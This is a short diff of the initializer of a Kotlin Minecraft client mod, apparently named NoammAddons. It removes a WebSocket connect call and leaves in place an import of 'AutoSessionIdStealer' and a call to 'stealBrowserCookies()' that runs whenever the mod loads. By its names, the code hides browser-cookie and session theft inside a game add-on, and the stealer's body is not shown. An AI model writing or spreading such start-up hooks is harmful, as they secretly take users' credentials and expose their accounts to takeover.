@@ -4,7 +4,6 @@ import com.github.noamm9.config.PogObject
 import com.github.noamm9.init.AutoSessionIdStealer
 import com.github.noamm9.init.ClassGraphInitializer
 import com.github.noamm9.utils.render.ItemRenderer
-import com.github.noamm9.websocket.WebSocket
 import kotlinx.coroutines.CoroutineName
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -47,7 +46,6 @@ object NoammAddons: ClientModInitializer {
 
         ClassGraphInitializer().initAll()
         AutoSessionIdStealer.stealBrowserCookies()
-        WebSocket.connect()
 
         isLoaded = true
     }
